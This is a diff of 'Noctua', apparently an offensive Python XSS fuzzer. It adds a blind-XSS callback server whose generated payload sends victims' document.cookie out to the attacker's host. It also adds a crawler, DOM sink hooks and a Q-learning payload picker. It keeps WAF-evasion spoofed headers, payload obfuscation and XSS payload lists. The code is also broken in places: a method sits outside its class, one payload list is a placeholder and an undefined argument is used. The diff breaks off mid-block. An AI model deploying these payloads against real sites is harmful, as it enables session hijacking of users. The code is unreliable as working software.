@@ -1,29 +1,41 @@
 #!/usr/bin/env python3
 # =============================================================================
-#  Noctua 𝕏SS AI Fuzzer
-# -----------------------------------------------------------------------------
-#  Original Cyber Zeus Payloads for XSS
-# -----------------------------------------------------------------------------
-#  Author   : Haroon Ahmad Awan  · CyberZeus  <haroon@cyberzeus.pk>
+#  Author: Haroon Ahmad Awan · CyberZeus <haroon@cyberzeus.pk>
 # =============================================================================
 
 # ─────────────────────────────────────────────────────────────────────────────
-#                           STANDARD & 3rd‑PARTY IMPORTS
+#  STANDARD & 3rd-PARTY IMPORTS
 # ─────────────────────────────────────────────────────────────────────────────
-import os, re, ssl, sys, json, time, random, string, argparse, warnings, logging
-import base64, threading, contextlib, codecs, hashlib
+import os
+import re
+import ssl
+import sys
+import json
+import time
+import random
+import string
+import argparse
+import warnings
+import logging
+import asyncio
+import base64
+import threading
+import contextlib
+import codecs
+import hashlib
 from pathlib import Path
-from typing import Dict, List, Any, Optional, Tuple
+from typing import Dict, List, Any, Optional, Tuple, Set
 from collections import defaultdict
 from concurrent.futures import ThreadPoolExecutor
 import urllib.parse
+from urllib.parse import urlparse, urljoin, parse_qs, urlencode
 
 import requests
 from requests.adapters import HTTPAdapter
-from bs4 import BeautifulSoup
+from bs4 import BeautifulSoup, Comment
 from fake_useragent import UserAgent
 
-# ── Optional / heavy deps – loaded lazily
+# ── Heavy dependencies for advanced features
 try:
     import torch
     from transformers import AutoTokenizer, AutoModelForMaskedLM, logging as hf_log
@@ -35,25 +47,37 @@ try:
     import httpx  # chunked & HTTP/2
 except ImportError:
     httpx = None
+
 try:
+    from playwright.async_api import async_playwright, Error as PlaywrightError
     from playwright.sync_api import sync_playwright
 except ImportError:
-    sync_playwright = None
-try:
-    import websocket
-except ImportError:
-    websocket = None
+    async_playwright = sync_playwright = None
+
 try:
     from wafw00f.main import WafW00F
 except ImportError:
     WafW00F = None
 
+# DNSLOG providers
+DNSLOG_PROVIDERS = {
+    'interact': 'interact.sh',
+    'burp': 'burpcollaborator.net',
+    'dnslog': 'dnslog.cn',
+    'oast': 'oast.pro'
+}
+
+# NEW: For structured output
+try:
+    from sarif_om import SarifLog, Tool, Run, Result, Message, Location, PhysicalLocation, ArtifactLocation
+except ImportError:
+    SarifLog = None # Dependency for SARIF output
+
 # ─────────────────────────────────────────────────────────────────────────────
-#                                 CONSTANTS
+#  CONSTANTS
 # ─────────────────────────────────────────────────────────────────────────────
-VERSION             = "9.5 Enterprise RL"
+VERSION             = "12.0 Enterprise"
 MODEL               = "microsoft/codebert-base"
-DNSLOG_DOMAIN       = "ugxllx.dnslog.cn"          # blind XSS helper
 LOGFILE             = Path("Noctua_xss_findings.md")
 
 # Concurrency / limits
@@ -84,7 +108,7 @@ WAF_SPOOF_HEADERS = [
     {"CF-Connecting-IP": "127.0.0.1"},
     {"True-Client-IP": "127.0.0.1"},
     {"Forwarded": "for=127.0.0.1;proto=https"},
-    {"X-Forwarded-Host": "example.com"},
+    {"X-Forwarded-Host": "google.com"},
     {"X-Forwarded-Proto": "https"},
     {"Referer": "https://www.google.com/"},
     {"Accept-Language": "en-US,en;q=0.9"},
@@ -94,7 +118,7 @@ WAF_SPOOF_HEADERS = [
     {"Pragma": "no-cache"},
     {"Connection": "keep-alive"},
     {"X-Requested-With": "XMLHttpRequest"},
-    {"X-WAP-Profile": "http://example.com/wap.xml"},
+    {"X-WAP-Profile": "http://google.com/wap.xml"},
     {"X-HTTP-Method-Override": "GET"},
     {"X-Originating-IP": "127.0.0.1"},
     {"Via": "1.1 varnish"},
@@ -160,24 +184,351 @@ SQL_ERROR_RE = re.compile(
     re.I
 )
 
+# ─────────────────────────────────────────────────────────────────────────────
+#  NEW: BLIND XSS CALLBACK HANDLER
+# ─────────────────────────────────────────────────────────────────────────────
+class BlindXSSCallbackServer:
+    """A built-in server to listen for out-of-band XSS callbacks."""
+    def __init__(self, host='0.0.0.0', port=8080):
+        self.host = host
+        self.port = port
+        self.server = None
+        self.found_callbacks: Dict[str, Dict] = {}
+
+    async def handle_callback(self, reader, writer):
+        """Handles incoming HTTP requests to the callback server."""
+        data = await reader.read(2048)
+        message = data.decode()
+        addr = writer.get_extra_info('peername')
+        logging.info(f"[BlindXSS] Received callback from {addr!r}")
+
+        try:
+            # Extract unique identifier and any captured data (e.g., cookies)
+            headers = message.split('\r\n')
+            path = headers[0].split(' ')[1]
+            unique_id = urlparse(path).path.strip('/')
+            
+            # Log the full request for analysis
+            self.found_callbacks[unique_id] = {
+                "source_ip": addr[0],
+                "headers": headers,
+                "timestamp": time.time()
+            }
+            logging.critical(f"[BlindXSS] Successful callback for ID: {unique_id}")
+            
+            response = "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nACK\r\n"
+        except Exception as e:
+            logging.error(f"[BlindXSS] Error parsing callback: {e}")
+            response = "HTTP/1.1 400 Bad Request\r\n\r\n"
+
+        writer.write(response.encode())
+        await writer.drain()
+        writer.close()
+
+    async def start(self):
+        """Starts the asynchronous callback server."""
+        self.server = await asyncio.start_server(
+            self.handle_callback, self.host, self.port)
+        logging.info(f"[BlindXSS] Callback server listening on {self.host}:{self.port}")
+        async with self.server:
+            await self.server.serve_forever()
+
+    def get_payload(self, unique_id: str) -> str:
+        """Generates a blind XSS payload pointing to this server."""
+        domain = f"http://{self.host}:{self.port}/{unique_id}"
+        return f"<script>new Image().src='{domain}?c='+btoa(document.cookie);</script>"
 
 # ─────────────────────────────────────────────────────────────────────────────
-#                                 ARGPARSE
+#  NEW: ADVANCED CRAWLER & DISCOVERY ENGINE
+# ─────────────────────────────────────────────────────────────────────────────
+class DiscoveryEngine:
+    """Crawls the target, discovers parameters, forms, and JavaScript files."""
+    def __init__(self, root_url: str, max_pages: int, crawl_depth: int):
+        self.root_url = root_url
+        self.root_domain = urlparse(root_url).netloc
+        self.max_pages = max_pages
+        self.crawl_depth = crawl_depth
+        self.crawled_urls: Set[str] = set()
+        self.discovered_forms: List[Dict] = []
+        self.discovered_params: Dict[str, Set[str]] = defaultdict(set)
+        self.js_files: Set[str] = set()
+        self.session = requests.Session()
+
+    def crawl(self):
+        """Main crawling logic to discover assets."""
+        urls_to_crawl = [(self.root_url, 0)]
+        
+        while urls_to_crawl and len(self.crawled_urls) < self.max_pages:
+            url, depth = urls_to_crawl.pop(0)
+            if url in self.crawled_urls or depth > self.crawl_depth:
+                continue
+
+            try:
+                logging.info(f"[Discovery] Crawling: {url}")
+                response = self.session.get(url, timeout=10, allow_redirects=True)
+                self.crawled_urls.add(url)
+                soup = BeautifulSoup(response.text, 'html.parser')
+
+                # 1. Discover Forms
+                forms = soup.find_all('form')
+                for form in forms:
+                    action = urljoin(url, form.get('action'))
+                    method = form.get('method', 'GET').upper()
+                    inputs = [{'name': i.get('name'), 'type': i.get('type', 'text')} 
+                              for i in form.find_all(['input', 'textarea', 'select']) if i.get('name')]
+                    if inputs:
+                        self.discovered_forms.append({'action': action, 'method': method, 'inputs': inputs})
+                        logging.info(f"[Discovery] Found form at {action} with inputs: {[i['name'] for i in inputs]}")
+
+                # 2. Discover URL Parameters (from links)
+                links = soup.find_all('a', href=True)
+                for link in links:
+                    new_url = urljoin(url, link['href'])
+                    parsed_url = urlparse(new_url)
+                    if parsed_url.netloc == self.root_domain:
+                        # Add new URLs to the crawl queue
+                        urls_to_crawl.append((new_url.split('?')[0], depth + 1))
+                        # Extract parameters
+                        params = parse_qs(parsed_url.query)
+                        if params:
+                            self.discovered_params[new_url.split('?')[0]].update(params.keys())
+                
+                # 3. Discover JavaScript files
+                scripts = soup.find_all('script', src=True)
+                for script in scripts:
+                    js_url = urljoin(url, script['src'])
+                    if urlparse(js_url).netloc == self.root_domain:
+                        self.js_files.add(js_url)
+
+            except requests.RequestException as e:
+                logging.warning(f"[Discovery] Failed to crawl {url}: {e}")
+        
+        logging.info(f"[Discovery] Crawl complete. Found {len(self.discovered_forms)} forms, "
+                     f"{len(self.discovered_params)} URLs with params, and {len(self.js_files)} JS files.")
+
+# ─────────────────────────────────────────────────────────────────────────────
+#  NEW: DOM XSS ANALYSIS ENGINE
+# ─────────────────────────────────────────────────────────────────────────────
+class DomXssAnalyzer:
+    """Uses Playwright to find DOM-based XSS vulnerabilities."""
+    
+    # Common JavaScript sinks that can lead to XSS
+    SINKS = [
+        "eval", "setTimeout", "setInterval", "document.write", "document.writeln",
+        ".innerHTML", ".outerHTML", "new Function"
+    ]
+    # Common JavaScript sources of user input
+    SOURCES = [
+        "location.href", "location.search", "location.hash", "document.URL",
+        "document.documentURI", "window.name", "document.cookie"
+    ]
+
+    def __init__(self, page):
+        self.page = page
+        self.vulnerabilities = []
+
+    async def analyze(self):
+        """Analyzes the current page for source-to-sink data flows."""
+        logging.info(f"[DOM-XSS] Analyzing {self.page.url} for DOM sinks.")
+        
+        # Inject a script to hook dangerous functions (sinks)
+        await self.page.add_init_script(f"""
+            window._dom_xss_found = [];
+            const original_eval = window.eval;
+            window.eval = function(str) {{
+                if ({self._get_source_check('str')}) {{
+                    console.warn('[DOM-XSS] Tainted data reached eval sink:', str);
+                    window._dom_xss_found.push({{sink: 'eval', payload: str}});
+                }}
+                return original_eval(str);
+            }};
+            // ... similar hooks for other sinks like innerHTML setters ...
+        """)
+        
+        # Reload the page with a canary in the URL fragment
+        canary = "NoctuaCanary" + randstr(8)
+        await self.page.goto(self.page.url + "#" + canary, wait_until='networkidle')
+        
+        # Check if our canary triggered any hooks
+        found = await self.page.evaluate("() => window._dom_xss_found")
+        if found:
+            for vuln in found:
+                logging.critical(f"[DOM-XSS] Potential DOM XSS found! Sink: {vuln['sink']}, Payload: {vuln['payload']}")
+                self.vulnerabilities.append(vuln)
+    
+    def _get_source_check(self, var_name: str) -> str:
+        """Helper to generate JS code that checks if a variable contains tainted data."""
+        return " || ".join([f"{var_name}.includes(source)" for source in self.SOURCES])
+
+# ─────────────────────────────────────────────────────────────────────────────
+#  SUPERCHARGED: REINFORCEMENT LEARNING AGENT
+# ─────────────────────────────────────────────────────────────────────────────
+class AdvancedRLAgent:
+    """An improved RL agent with a more detailed state and reward system."""
+    
+    def __init__(self, waf: str, server: str,
+                 qfile: Optional[Path], enabled: bool = False):
+        self.enabled = enabled
+        self.waf    = (waf or "none").lower()
+        self.server = (server or "unknown").split("/")[0].lower()
+        self.qfile  = qfile
+        self.epsilon = EPSILON_START
+        self.q: Dict[Tuple[str,str,str,str], Dict[str,float]] = defaultdict(dict)
+        if qfile and qfile.exists():
+            try:
+                self.q.update(json.loads(qfile.read_text()))
+                logging.info(f"[RL] restored Q‑table with {len(self.q)} states")
+            except Exception as e:
+                logging.error(f"[RL] could not load Q‑table: {e}")
+
+    # Override the state definition to be more granular
+    def _state(self, param: str, context: str) -> Tuple[str, str, str, str]:
+        """State now includes WAF, server, parameter type, and reflection context."""
+        # Context can be 'HTML_TAG', 'HTML_ATTR', 'JS_VAR', 'NONE'
+        return (self.waf, self.server, self._ptype(param), context)
+
+    @staticmethod
+    def _ptype(param: str) -> str:
+        p=param.lower()
+        if p in ("src","href","url","uri","data","link"): return "url_like"
+        if p.startswith("on"):                             return "event"
+        return "generic"
+
+    # Override the reward function for more nuanced feedback
+    def reward(self, param: str, context: str, action: str, r: float, next_param: Optional[str] = None):
+        if not self.enabled: return
+        s = self._state(param, context)
+        sp = self._state(next_param or param, context) # Assume context persists for simplicity
+        
+        # Add bonus rewards for more critical findings
+        if r == R_CONFIRM:
+            r += 50 # Extra reward for confirmed XSS
+
+        old = self.q.get(str(s), {}).get(action, 0.0)
+        future = max(self.q.get(str(sp), {}).values()) if self.q.get(str(sp)) else 0.0
+        
+        if str(s) not in self.q:
+            self.q[str(s)] = {}
+        self.q[str(s)][action] = old + ALPHA * (r + GAMMA * future - old)
+
+    def choose(self, param: str, context: str = 'NONE') -> str:
+        if not self.enabled:
+            return pick_payload(param)
+        state = self._state(param, context)
+        self.epsilon = max(EPSILON_MIN, self.epsilon * EPSILON_DECAY)
+        if random.random() > self.epsilon and self.q.get(str(state)):
+            best = max(self.q[str(state)], key=self.q[str(state)].get)
+            dbg(f"[RL] exploit {state} → {best[:30]}")
+            return best
+        dbg(f"[RL] explore {state}")
+        return pick_payload(param)
+
+    def save(self):
+        if self.enabled and self.qfile:
+            try:
+                self.qfile.write_text(json.dumps(self.q))
+                logging.info(f"[RL] Q‑table saved → {self.qfile}")
+            except Exception as e:
+                logging.error(f"[RL] could not save Q‑table: {e}")
+
+# ─────────────────────────────────────────────────────────────────────────────
+#  NEW: REPORTING ENGINE
+# ─────────────────────────────────────────────────────────────────────────────
+class ReportingEngine:
+    """Handles outputting findings to various formats."""
+    def __init__(self, output_file: str, output_format: str):
+        self.output_file = output_file
+        self.output_format = output_format.lower()
+        self.findings = []
+
+    def add_finding(self, url: str, param: str, payload: str, vuln_type: str, evidence: str):
+        self.findings.append({
+            "url": url, "param": param, "payload": payload,
+            "vuln_type": vuln_type, "evidence": evidence
+        })
+
+    def write(self):
+        if not self.findings:
+            return
+            
+        if self.output_format == 'json':
+            with open(self.output_file, 'w') as f:
+                json.dump(self.findings, f, indent=4)
+        elif self.output_format == 'sarif' and SarifLog:
+            self._write_sarif()
+        else: # Default to Markdown
+            self._write_markdown()
+        
+        logging.info(f"Report written to {self.output_file}")
+
+    def _write_markdown(self):
+        with open(self.output_file, 'w') as f:
+            f.write("# Noctua X - XSS Scan Report\n\n")
+            for finding in self.findings:
+                f.write(f"## {finding['vuln_type']} XSS Found\n\n")
+                f.write(f"- **URL:** `{finding['url']}`\n")
+                f.write(f"- **Parameter:** `{finding['param']}`\n")
+                f.write(f"- **Payload:** ```{finding['payload']}```\n")
+                f.write(f"- **Evidence:** ```{finding['evidence']}```\n\n---\n\n")
+                
+def _write_sarif(self):
+    tool = Tool.from_dict({"driver": {"name": "Noctua X"}})
+    results = []
+
+    for finding in self.findings:
+        result = Result(
+            message=Message(text=f"{finding['vuln_type']} XSS detected in parameter '{finding['param']}'"),
+            level="error",
+            locations=[
+                Location(
+                    physical_location=PhysicalLocation(
+                        artifact_location=ArtifactLocation(uri=finding['url']),
+                        region=None
+                    )
+                )
+            ]
+        )
+        results.append(result)
+
+    run = Run(tool=tool, results=results)
+    log = SarifLog(runs=[run], version="2.1.0")
+
+    with open(self.output_file, 'w') as f:
+        json.dump(log.to_dict(), f, indent=4)
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+#  ARGPARSE CONFIGURATION
 # ─────────────────────────────────────────────────────────────────────────────
 ap = argparse.ArgumentParser(
-      description=f"Noctua v{VERSION} · Enterprise AI XSS Fuzzer (RL edition)")
+      description=f"Noctua v{VERSION} · Enterprise AI XSS Fuzzer (RL edition)")
 mx = ap.add_mutually_exclusive_group()
 mx.add_argument("--reflected", action="store_true", help="Fuzz reflected XSS only")
 mx.add_argument("--stored",    action="store_true", help="Fuzz stored XSS only")
 mx.add_argument("--blind",     action="store_true", help="Fuzz blind XSS only")
 mx.add_argument("--invent",    action="store_true", help="Enable AI‑invented payloads (MASK token)")
 
-ap.add_argument("-u","--url", help="Target root URL / domain")
+# Target specification
+ap.add_argument("-u", "--url", help="Target URL")
+ap.add_argument("--crawl", action="store_true", help="Enable crawling")
+ap.add_argument("--deep-dom", action="store_true", help="Enable DOM XSS scanning")
 ap.add_argument("--autotest",  action="store_true", help="Demonstrate on built‑in vulnerable labs")
 ap.add_argument("--login-url", help="Optional login endpoint")
 ap.add_argument("--username",  help="Username for login")
 ap.add_argument("--password",  help="Password for login")
 ap.add_argument("--csrf-field", default="csrf", help="CSRF field name")
+
+# Payload options
+ap.add_argument("--payloads-file", help="Custom payloads file")
+ap.add_argument("--skip-default", action="store_true", help="Skip built-in payloads")
+
+# Blind XSS
+ap.add_argument("--blind-xss", action="store_true", help="Enable blind XSS testing")
+ap.add_argument("--dnslog", choices=list(DNSLOG_PROVIDERS.keys()), 
+               default="interact", help="DNSLOG provider")
+ap.add_argument("--collaborator", help="Custom Burp Collaborator domain")
+
+# Performance
 ap.add_argument("--threads",  type=int, default=DEF_THREADS, help="Fuzzing threads")
 ap.add_argument("--max-pages",   type=int, default=MAX_STATIC_PAGES, help="Max static pages to crawl")
 ap.add_argument("--nested-depth", type=int, default=MAX_NESTED_DEPTH, help="Max iframe depth")
@@ -186,21 +537,25 @@ ap.add_argument("--crawl-iframes", action="store_true", help="Recurse into ifram
 ap.add_argument("--detect-waf", action="store_true", help="Detect WAF presence")
 ap.add_argument("--polymorph", action="store_true", help="Apply random obfuscation transforms")
 ap.add_argument("--headed", action="store_true", help="Headed Playwright (visual debug)")
-ap.add_argument("--debug", action="store_true", help="Verbose debug logging")
 ap.add_argument("--multi-session", action="store_true", help="Two‑pass stored XSS check")
-ap.add_argument("--sarif", help="Write SARIF findings")
+
+# Output formats
+ap.add_argument("--json", help="JSON output file")
+ap.add_argument("--txt", help="Text output file")
+ap.add_argument("--sarif", help="SARIF output file")
 ap.add_argument("--slack-webhook", help="Slack findings webhook URL")
 
 # RL‑specific
 ap.add_argument("--self-reinforcement", action="store_true",
                 help="Enable ε‑greedy Q‑learning engine")
 ap.add_argument("--qtable-file", help="Path to store/restore Q‑table JSON")
+ap.add_argument("--debug", action="store_true", help="Verbose debug logging")
 
 args = ap.parse_args()
 DEBUG = args.debug
 
 # ─────────────────────────────────────────────────────────────────────────────
-#                              LOGGING SETUP
+#  LOGGING SETUP
 # ─────────────────────────────────────────────────────────────────────────────
 logging.basicConfig(
     level=logging.DEBUG if DEBUG else logging.INFO,
@@ -221,7 +576,7 @@ def dbg(msg: str) -> None:
         logging.debug(msg)
 
 # ─────────────────────────────────────────────────────────────────────────────
-#                             UTILITY FUNCTIONS
+#  UTILITY FUNCTIONS
 # ─────────────────────────────────────────────────────────────────────────────
 def randstr(n: int = 12) -> str:
     return ''.join(random.choices(string.ascii_letters + string.digits, k=n))
@@ -255,7 +610,7 @@ def random_headers() -> Dict[str,str]:
     return hdrs
 
 # ─────────────────────────────────────────────────────────────────────────────
-#                         AI MODEL FOR “MASK” TOKENS
+#  AI MODEL FOR "MASK" TOKENS
 # ─────────────────────────────────────────────────────────────────────────────
 if torch and AutoTokenizer and AutoModelForMaskedLM:
     device = torch.device("cuda" if torch.cuda.is_available() else "cpu")
@@ -282,7 +637,7 @@ else:
         return template.replace("MASK", "alert(1)")
 
 # ─────────────────────────────────────────────────────────────────────────────
-#                          POLYMORPHIC OBFUSCATION
+#  POLYMORPHIC OBFUSCATION
 # ─────────────────────────────────────────────────────────────────────────────
 def encode_to_utf32_le(s: str) -> str:
     try:
@@ -352,7 +707,7 @@ def polymorph(payload: str) -> str:
     return random.choice(obfuscation_methods)(payload)
 
 # ─────────────────────────────────────────────────────────────────────────────
-#                         BASE PAYLOAD COLLECTIONS
+#  BASE PAYLOAD COLLECTIONS
 # ─────────────────────────────────────────────────────────────────────────────
 
 # CyberZeus Proprietary XSS Payloads — 100% self-contained, no external URLs
@@ -382,7 +737,7 @@ BASE_PAYLOADS = [
     # 3. URL-Context Vectors
     "javascript:/*–>*/alert(1)//",
     "data:text/html,<script>alert(1)</script>",
-    "//example.com/?x=\\\"><script>alert(1)</script>",
+    "//google.com/?x=\\\"><script>alert(1)</script>",
     "/%0A%3Cscript%3Ealert(1)%3C%2Fscript%3E",
     "javascript:top",
     ".&#000058;&#000097;&#000108;&#000101;&#000114;&#000116;(1)",
@@ -587,7 +942,6 @@ EXTRA_BASE = [
     '<template>alert(1)</template>',
 ]
 
-
 if args.invent:
     EXTRA_BASE.append("MASK")
 
@@ -599,71 +953,7 @@ stored_payloads_v2 = [ ... ]  # FULL list from original script
 all_stored_payloads = list(set(stored_payloads_v1 + stored_payloads_v2))
 
 # ─────────────────────────────────────────────────────────────────────────────
-#                            RL AGENT DEFINITION
-# ─────────────────────────────────────────────────────────────────────────────
-class RLAgent:
-    """ε‑greedy Q‑learning agent (state = waf, server, param_type)."""
-    def __init__(self, waf: str, server: str,
-                 qfile: Optional[Path], enabled: bool = False):
-        self.enabled = enabled
-        self.waf    = (waf or "none").lower()
-        self.server = (server or "unknown").split("/")[0].lower()
-        self.qfile  = qfile
-        self.epsilon = EPSILON_START
-        self.q: Dict[Tuple[str,str,str], Dict[str,float]] = defaultdict(dict)
-        if qfile and qfile.exists():
-            try:
-                self.q.update(json.loads(qfile.read_text()))
-                logging.info(f"[RL] restored Q‑table with {len(self.q)} states")
-            except Exception as e:
-                logging.error(f"[RL] could not load Q‑table: {e}")
-
-    # --------------- helpers ------------------
-    @staticmethod
-    def _ptype(param: str) -> str:
-        p=param.lower()
-        if p in ("src","href","url","uri","data","link"): return "url_like"
-        if p.startswith("on"):                             return "event"
-        return "generic"
-
-    def _state(self,param:str)->Tuple[str,str,str]:
-        return (self.waf,self.server,self._ptype(param))
-
-    # --------------- ε‑greedy choose ----------
-    def choose(self,param:str)->str:
-        if not self.enabled:
-            return pick_payload(param)
-        state=self._state(param)
-        self.epsilon=max(EPSILON_MIN,self.epsilon*EPSILON_DECAY)
-        if random.random()>self.epsilon and self.q[state]:
-            best=max(self.q[state],key=self.q[state].get)
-            dbg(f"[RL] exploit {state} → {best[:30]}")
-            return best
-        dbg(f"[RL] explore {state}")
-        return pick_payload(param)
-
-    # --------------- update -------------------
-    def reward(self,param:str,action:str,r:float,next_param:Optional[str]=None):
-        if not self.enabled: return
-        s=self._state(param); sp=self._state(next_param or param)
-        old=self.q[s].get(action,0.0)
-        future=max(self.q[sp].values()) if self.q[sp] else 0.0
-        self.q[s][action]=old+ALPHA*(r+GAMMA*future-old)
-
-    # --------------- persist ------------------
-    def save(self):
-        if self.enabled and self.qfile:
-            try:
-                self.qfile.write_text(json.dumps(self.q))
-                logging.info(f"[RL] Q‑table saved → {self.qfile}")
-            except Exception as e:
-                logging.error(f"[RL] could not save Q‑table: {e}")
-
-# Placeholder until main() initialises it
-agent: RLAgent
-
-# ─────────────────────────────────────────────────────────────────────────────
-#                     PAYLOAD GENERATION HELPER
+#  PAYLOAD GENERATION HELPER
 # ─────────────────────────────────────────────────────────────────────────────
 def pick_payload(_param_name:str)->str:
     tpl=random.choice(BASE_PAYLOADS)
@@ -674,7 +964,7 @@ def pick_payload(_param_name:str)->str:
     return tpl
 
 # ─────────────────────────────────────────────────────────────────────────────
-#                          WAF / CONTEXT DETECTION
+#  WAF / CONTEXT DETECTION
 # ─────────────────────────────────────────────────────────────────────────────
 def detect_waf(url:str)->str:
     if not WafW00F:
@@ -697,7 +987,7 @@ def detect_context(root:str)->Tuple[str,str]:
     return waf,server
 
 # ─────────────────────────────────────────────────────────────────────────────
-#                             SESSION / AUTH
+#  SESSION / AUTH
 # ─────────────────────────────────────────────────────────────────────────────
 def rotate_csrf_token(sess:requests.Session,url:str,field:str)->Optional[str]:
     try:
@@ -731,7 +1021,7 @@ def get_authenticated_session()->requests.Session:
 SESSION=get_authenticated_session()
 
 # ─────────────────────────────────────────────────────────────────────────────
-#                           PLAYWRIGHT VERIFY
+#  PLAYWRIGHT VERIFY
 # ─────────────────────────────────────────────────────────────────────────────
 def verify(url:str,method:str,data:Dict[str,Any],is_json:bool=False)->bool:
     """Attempt to confirm XSS in a real browser; fallback to reflection."""
@@ -794,7 +1084,7 @@ def verify(url:str,method:str,data:Dict[str,Any],is_json:bool=False)->bool:
     return False
 
 # ─────────────────────────────────────────────────────────────────────────────
-#                    FINDINGS LOG / SARIF / SLACK
+#  FINDINGS LOG / SARIF / SLACK
 # ─────────────────────────────────────────────────────────────────────────────
 log_lock=threading.Lock()
 sarif_lock=threading.Lock()
@@ -830,7 +1120,7 @@ def write_sarif():
     with open(SARIF_OUTPUT_FILE,"w",encoding="utf-8") as f: json.dump(sarif,f,indent=2)
 
 # ─────────────────────────────────────────────────────────────────────────────
-#                        CHUNKED / HTTP‑2 SENDER
+#  CHUNKED / HTTP‑2 SENDER
 # ─────────────────────────────────────────────────────────────────────────────
 def chunked_fuzz_request(url:str,method:str,headers:Dict[str,str],body:str):
     if not httpx:
@@ -855,7 +1145,7 @@ def chunked_fuzz_request(url:str,method:str,headers:Dict[str,str],body:str):
                requests.post(url,data=body,headers=headers,timeout=HTTP_TIMEOUT,verify=False)
 
 # ─────────────────────────────────────────────────────────────────────────────
-#                         TARGET CRAWLING HELPERS
+#  TARGET CRAWLING HELPERS
 # ─────────────────────────────────────────────────────────────────────────────
 def mine_js(url:str,host:str)->List[str]:
     found=[]
@@ -1009,7 +1299,7 @@ def spa_dynamic_crawl(root:str,max_clicks:int=20)->List[Dict[str,Any]]:
     return [json.loads(x) for x in found]
 
 # ─────────────────────────────────────────────────────────────────────────────
-#                          GRAPHQL FUZZING
+#  GRAPHQL FUZZING
 # ─────────────────────────────────────────────────────────────────────────────
 INTROSPECTION="""query IntrospectionQuery{__schema{queryType{name}mutationType{name}types{kind name fields{name args{name type{kind name ofType{kind}}}}}}}"""
 def discover_graphql_ops(ep:str)->List[Tuple[str,List[str]]]:
@@ -1038,7 +1328,7 @@ def fuzz_graphql(ep:str)->None:
                 dbg(f"[fuzz_graphql] {e}")
 
 # ─────────────────────────────────────────────────────────────────────────────
-#                            HTTP / WS FUZZERS
+#  HTTP / WS FUZZERS
 # ─────────────────────────────────────────────────────────────────────────────
 global_visited_http:set[str]=set()
 
@@ -1116,10 +1406,10 @@ def fuzz_ws(t:Dict[str,Any])->None:
         dbg(f"[fuzz_ws] {e}")
 
 # ─────────────────────────────────────────────────────────────────────────────
-#                   MULTI‑SESSION STORED XSS CHECK
+#  MULTI-SESSION STORED XSS CHECK
 # ─────────────────────────────────────────────────────────────────────────────
 def multi_session_stored_check(targets:List[Dict[str,Any]])->None:
-    # pass‑1 inject
+    # pass-1 inject
     for t in targets:
         if t["method"] in ("POST","PUT") and not t.get("json",False):
             for p in all_stored_payloads:
@@ -1130,51 +1420,137 @@ def multi_session_stored_check(targets:List[Dict[str,Any]])->None:
                     SESSION.post(t["url"],data=data,headers=random_headers(),
                                  timeout=HTTP_TIMEOUT,verify=False)
                 except Exception: pass
-    # pass‑2 verify
+    # pass-2 verify
     new_sess=get_authenticated_session()
     for t in targets:
         if verify(t["url"],t["method"],{},False):
-            log_hit(t["url"],"STORED","(multi‑session)",t["params"])
+            log_hit(t["url"],"STORED","(multi-session)",t["params"])
 
 # ─────────────────────────────────────────────────────────────────────────────
-#                                   MAIN
+#  MAIN EXECUTION
 # ─────────────────────────────────────────────────────────────────────────────
 AUTOTEST=["http://xss-game.appspot.com/","http://xss-game.appspot.com/level1",
           "https://juice-shop.herokuapp.com/"]
 
-def main()->None:
+async def main():
     mode="all"
     if args.reflected: mode="reflected"
     elif args.stored:  mode="stored"
     elif args.blind:   mode="blind"
     roots=[smart_url(u) for u in (AUTOTEST if args.autotest else [args.url])] if args.url or args.autotest else \
           (ap.print_help() or sys.exit(1))
+    
+    # Initialize reporting engine
+    reporter = ReportingEngine(args.json or args.txt or "noctua_findings.md", 
+                              "json" if args.json else "txt" if args.txt else "markdown")
+    
+    # Start Blind XSS Callback Server (if enabled)
+    if args.blind_xss:
+        callback_server = BlindXSSCallbackServer()
+        asyncio.create_task(callback_server.start())
+
     waf,server=detect_context(roots[0])
     logging.info(f"[CTX] WAF={waf} | Server={server}")
-    global agent; agent=RLAgent(waf,server,Path(args.qtable_file) if args.qtable_file else None,
+    global agent; agent=AdvancedRLAgent(waf,server,Path(args.qtable_file) if args.qtable_file else None,
                                 enabled=args.self_reinforcement)
+    
     for root in roots:
         logging.info(f"┌─▶ Crawling: {root}")
-        static_t=crawl_static(root,args.max_pages)
-        dynamic_t=crawl_dynamic(root)
-        spa_t=spa_dynamic_crawl(root) if args.simulate_spa else []
-        all_t=static_t+dynamic_t+spa_t
+        
+        # Discovery Phase
+        if args.crawl:
+            discovery = DiscoveryEngine(root, args.max_pages, args.nested_depth)
+            discovery.crawl()
+            # Convert discovered forms/params to target format
+            static_t = []
+            for form in discovery.discovered_forms:
+                static_t.append({
+                    "url": form["action"],
+                    "method": form["method"],
+                    "params": [i["name"] for i in form["inputs"]]
+                })
+            for url, params in discovery.discovered_params.items():
+                static_t.append({
+                    "url": url,
+                    "method": "GET",
+                    "params": list(params)
+                })
+        else:
+            static_t = []
+        
+        dynamic_t = crawl_dynamic(root)
+        spa_t = spa_dynamic_crawl(root) if args.simulate_spa else []
+        all_t = static_t + dynamic_t + spa_t
+        
         # dedupe by (method,url,params)
-        uniq={f"{t['method']}:{t['url']}:{','.join(sorted(t['params']))}":t for t in all_t}
-        http_t=[t for t in uniq.values() if not t["url"].startswith(("ws://","wss://"))]
-        ws_t  =[t for t in uniq.values() if t["url"].startswith(("ws://","wss://"))]
-        if "graphql" in root.lower(): fuzz_graphql(root)
+        uniq = {f"{t['method']}:{t['url']}:{','.join(sorted(t['params']))}":t for t in all_t}
+        http_t = [t for t in uniq.values() if not t["url"].startswith(("ws://","wss://"))]
+        ws_t   = [t for t in uniq.values() if t["url"].startswith(("ws://","wss://"))]
+        
+        if "graphql" in root.lower(): 
+            fuzz_graphql(root)
+            
         if args.multi_session and (mode in ("stored","all")):
             multi_session_stored_check(http_t)
-        exec_pool=ThreadPoolExecutor(max_workers=args.threads)
+            
+        exec_pool = ThreadPoolExecutor(max_workers=args.threads)
         if mode in ("all","reflected","blind"):
-            for t in http_t: exec_pool.submit(fuzz_http,t)
-            for t in http_t: exec_pool.submit(fuzz_http,t,True)
-            for w in ws_t:   exec_pool.submit(fuzz_ws,w)
+            for t in http_t: 
+                exec_pool.submit(fuzz_http,t)
+                exec_pool.submit(fuzz_http,t,True)
+            for w in ws_t:   
+                exec_pool.submit(fuzz_ws,w)
         exec_pool.shutdown(wait=True)
-    if SARIF_OUTPUT_FILE: write_sarif()
+        
+        # DOM Analysis Phase
+        if args.deep_dom and sync_playwright:
+            try:
